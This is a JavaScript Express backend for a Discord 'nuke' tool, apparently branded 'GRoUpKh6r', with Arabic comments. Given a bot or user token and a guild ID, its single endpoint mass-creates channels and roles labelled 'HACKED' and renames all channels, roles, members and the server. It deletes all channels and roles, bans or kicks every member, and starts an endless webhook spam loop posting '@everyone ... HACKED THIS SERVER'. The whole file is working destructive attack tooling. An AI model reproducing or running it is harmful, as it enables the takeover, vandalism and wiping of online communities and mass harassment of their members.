// language: JavaScript, file: server.js, target: Node.js Express Backend & Ultra-Fast Discord Engine
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const activeSpamSessions = new Map();

app.post('/api/execute', async (req, res) => {
    const { action, token, guildId, targetName, count, spamMessage, whName } = req.body;
    
    if (!token || !guildId) {
        return res.status(400).json({ success: false, error: 'Token or Guild ID missing' });
    }

    const authHeader = token.startsWith('MT') ? token : `Bot ${token}`;
    const headers = { "Authorization": authHeader, "Content-Type": "application/json" };
    const maxCount = parseInt(count) || 50;
    const nameToUse = targetName || 'GRoUpKh6r-HACKED';

    try {
        // 1. إنشاء رومات
        if (action === 'create_channels') {
            const promises = Array.from({ length: maxCount }, () =>
                fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
                    method: 'POST',
                    headers,
                    body: JSON.stringify({ name: nameToUse, type: 0 })
                })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: `Created ${maxCount} channels instantly.` });
        }

        // 2. إنشاء رولات
        if (action === 'create_roles') {
            const promises = Array.from({ length: maxCount }, () =>
                fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, {
                    method: 'POST',
                    headers,
                    body: JSON.stringify({ name: nameToUse, color: 0xff0000 })
                })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: `Created ${maxCount} roles instantly.` });
        }

        // 3. تعديل أسماء الرومات
        if (action === 'rename_channels') {
            const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
            const channels = await channelsRes.json();
            
            const promises = channels.map(ch =>
                fetch(`https://discord.com/api/v10/channels/${ch.id}`, {
                    method: 'PATCH',
                    headers,
                    body: JSON.stringify({ name: nameToUse })
                })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: `Renamed all channels to ${nameToUse}.` });
        }

        // 4. تعديل أسماء الرولات
        if (action === 'rename_roles') {
            const rolesRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, { headers });
            if (!rolesRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch roles' });
            const roles = await rolesRes.json();
            
            const promises = roles.map(r => {
                if (r.name !== '@everyone') {
                    return fetch(`https://discord.com/api/v10/guilds/${guildId}/roles/${r.id}`, {
                        method: 'PATCH',
                        headers,
                        body: JSON.stringify({ name: nameToUse })
                    });
                }
            }).filter(Boolean);
            await Promise.all(promises);
            return res.json({ success: true, message: `Renamed all roles to ${nameToUse}.` });
        }

        // 5. تعديل أسماء جميع أعضاء السيرفر
        if (action === 'rename_members') {
            const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
            if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
            const members = await membersRes.json();
            
            const promises = members.map(m =>
                fetch(`https://discord.com/api/v10/guilds/${guildId}/members/${m.user.id}`, {
                    method: 'PATCH',
                    headers,
                    body: JSON.stringify({ nick: nameToUse })
                })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: `Renamed all members to ${nameToUse}.` });
        }

        // 6. تعديل اسم السيرفر
        if (action === 'set_server_name') {
            const r = await fetch(`https://discord.com/api/v10/guilds/${guildId}`, {
                method: 'PATCH',
                headers,
                body: JSON.stringify({ name: nameToUse })
            });
            if (!r.ok) return res.status(400).json({ success: false, error: 'Failed to change server name' });
            return res.json({ success: true, message: `Server name changed to ${nameToUse}.` });
        }

        // 7. حذف الرومات
        if (action === 'delete_channels') {
            const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
            const channels = await channelsRes.json();
            
            const promises = channels.map(ch =>
                fetch(`https://discord.com/api/v10/channels/${ch.id}`, { method: 'DELETE', headers })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: 'All channels deleted successfully.' });
        }

        // 8. حذف الرولات
        if (action === 'delete_roles') {
            const rolesRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, { headers });
            if (!rolesRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch roles' });
            const roles = await rolesRes.json();
            
            const promises = roles.map(r => {
                if (r.name !== '@everyone' && !r.managed) {
                    return fetch(`https://discord.com/api/v10/guilds/${guildId}/roles/${r.id}`, { method: 'DELETE', headers });
                }
            }).filter(Boolean);
            await Promise.all(promises);
            return res.json({ success: true, message: 'All eligible roles deleted.' });
        }

        // 9. باند جميع الأعضاء
        if (action === 'ban_all') {
            const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
            if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
            const members = await membersRes.json();
            
            const promises = members.map(m =>
                fetch(`https://discord.com/api/v10/guilds/${guildId}/bans/${m.user.id}`, {
                    method: 'PUT',
                    headers,
                    body: JSON.stringify({ delete_message_seconds: 0 })
                })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: 'All members banned successfully.' });
        }

        // 10. طرد جميع الأعضاء
        if (action === 'kick_all') {
            const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
            if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
            const members = await membersRes.json();
            
            const promises = members.map(m =>
                fetch(`https://discord.com/api/v10/guilds/${guildId}/members/${m.user.id}`, { method: 'DELETE', headers })
            );
            await Promise.all(promises);
            return res.json({ success: true, message: 'All members kicked successfully.' });
        }

        // 11. إنشاء ويبهوكات بكل رومات السيرفر
        if (action === 'create_webhooks') {
            const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
            const channels = await channelsRes.json();
            
            let countCreated = 0;
            const promises = channels.map(async ch => {
                if (ch.type === 0) {
                    const whRes = await fetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
                        method: 'POST',
                        headers,
                        body: JSON.stringify({ name: whName || 'GRoUpKh6r-Spam' })
                    });
                    if (whRes.ok) countCreated++;
                }
            });
            await Promise.all(promises);
            return res.json({ success: true, message: `Created webhooks in all text channels (${countCreated} webhooks).` });
        }

        // 12. سبام لا ينتهي بأقصى سرعة عالمية عبر الويبهوكات
        if (action === 'start_infinite_spam') {
            const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
            if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
            const channels = await channelsRes.json();
            
            const webhooks = [];
            for (const ch of channels) {
                if (ch.type === 0) {
                    const whRes = await fetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
                        method: 'POST',
                        headers,
                        body: JSON.stringify({ name: whName || 'GRoUpKh6r-Spam' })
                    });
                    if (whRes.ok) {
                        const whData = await whRes.json();
                        webhooks.push(`https://discord.com/api/v10/webhooks/${whData.id}/${whData.token}`);
                    }
                }
            }

            if (webhooks.length === 0) {
                return res.json({ success: false, error: 'No text channels found to create webhooks.' });
            }

            const sessionKey = `${guildId}_spam`;
            activeSpamSessions.set(sessionKey, true);

            // تفعيل حلقة سبام لا نهائية وعالية السرعة لا تتوقف إلا بأمر الإيقاف أو الحذف
            (async () => {
                while (activeSpamSessions.get(sessionKey)) {
                    await Promise.all(webhooks.map(async (url) => {
                        try {
                            await fetch(url, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ content: spamMessage || '@everyone GRoUpKh6r HACKED THIS SERVER' })
                            });
                        } catch (e) {}
                    }));
                }
            })();

            return res.json({ success: true, message: `Infinite world-class spam started across ${webhooks.length} webhooks without stopping.` });
        }

        // 13. إيقاف السبام
        if (action === 'stop_spam') {
            const sessionKey = `${guildId}_spam`;
            activeSpamSessions.set(sessionKey, false);
            return res.json({ success: true, message: 'Infinite spam loop stopped.' });
        }

        res.status(400).json({ success: false, error: 'Unknown action command.' });

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`GRoUpKh6r ultimate engine active on port ${PORT}`);
});
